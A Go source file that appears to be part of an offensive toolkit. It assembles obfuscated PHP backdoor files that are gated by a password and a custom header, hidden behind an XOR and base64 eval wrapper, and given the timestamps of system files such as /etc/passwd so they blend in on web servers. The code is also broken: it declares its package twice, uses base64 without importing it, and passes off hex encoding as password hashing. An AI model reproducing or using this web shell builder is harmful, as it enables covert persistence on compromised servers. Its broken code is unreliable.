package builder
// internal/builder/builder.go - PHP FILE ASSEMBLER
package builder

import (
    "crypto/rand"
    "encoding/hex"
    "fmt"
    "io/ioutil"
    "os"
    "strings"
    "time"
)

type Builder struct {
    config Config
}

type Config struct {
    OutputFile  string
    Password    string
    HeaderName  string
    HeaderValue string
}

func NewBuilder(cfg Config) *Builder {
    return &Builder{
        config: cfg,
    }
}

func (b *Builder) Build(obfuscatedCode string) error {
    // GENERATE RANDOM SALT
    salt := make([]byte, 16)
    rand.Read(salt)
    saltHex := hex.EncodeToString(salt)
    
    // APPLY CONFIGURATION
    replacements := map[string]string{
        "__PASSWORD__":     b.hashPassword(b.config.Password, saltHex),
        "__HEADER_NAME__":  b.config.HeaderName,
        "__HEADER_VALUE__": b.config.HeaderValue,
        "__SALT__":         saltHex,
        "__STEALTH_LEVEL__": "3",
    }
    
    finalCode := obfuscatedCode
    for key, value := range replacements {
        finalCode = strings.ReplaceAll(finalCode, key, value)
    }
    
    // ADD ENCRYPTION LAYER
    finalCode = b.addEncryptionLayer(finalCode)
    
    // WRITE TO FILE
    if err := ioutil.WriteFile(b.config.OutputFile, []byte(finalCode), 0644); err != nil {
        return err
    }
    
    // TOUCH FILE TO MATCH TIMESTAMP
    b.stompTimestamp(b.config.OutputFile)
    
    return nil
}

func (b *Builder) hashPassword(password, salt string) string {
    // SIMPLE HASH FOR DEMO - IN PRODUCTION USE STRONGER
    data := []byte(password + salt)
    hash := make([]byte, hex.EncodedLen(len(data)))
    hex.Encode(hash, data)
    return string(hash)
}

func (b *Builder) addEncryptionLayer(code string) string {
    // WRAP ENTIRE CODE IN ENCRYPTION LAYER
    wrapper := `<?php
// ENCRYPTION LAYER
$__ENC_KEY__ = "%s";

function __decrypt($data, $key) {
    $data = base64_decode($data);
    $result = '';
    for($i=0; $i<strlen($data); $i++) {
        $result .= $data[$i] ^ $key[$i %% strlen($key)];
    }
    return $result;
}

%s

?>
`
    
    // ENCRYPT THE MAIN CODE
    encrypted := b.xorEncrypt(code, []byte("VANGUARD_KEY"))
    
    return fmt.Sprintf(wrapper, base64.StdEncoding.EncodeToString([]byte("VANGUARD_KEY")), 
        "eval(__decrypt('"+encrypted+"', base64_decode('"+base64.StdEncoding.EncodeToString([]byte("VANGUARD_KEY"))+"')));")
}

func (b *Builder) xorEncrypt(data string, key []byte) string {
    encrypted := make([]byte, len(data))
    for i := 0; i < len(data); i++ {
        encrypted[i] = data[i] ^ key[i%len(key)]
    }
    return base64.StdEncoding.EncodeToString(encrypted)
}

func (b *Builder) stompTimestamp(filename string) {
    // TRY TO MATCH WITH SYSTEM FILE
    targets := []string{
        "/etc/passwd",
        "/bin/bash",
        "/var/www/html/index.php",
        "/usr/bin/php",
    }
    
    for _, target := range targets {
        if info, err := os.Stat(target); err == nil {
            os.Chtimes(filename, info.ModTime(), info.ModTime())
            break
        }
    }
}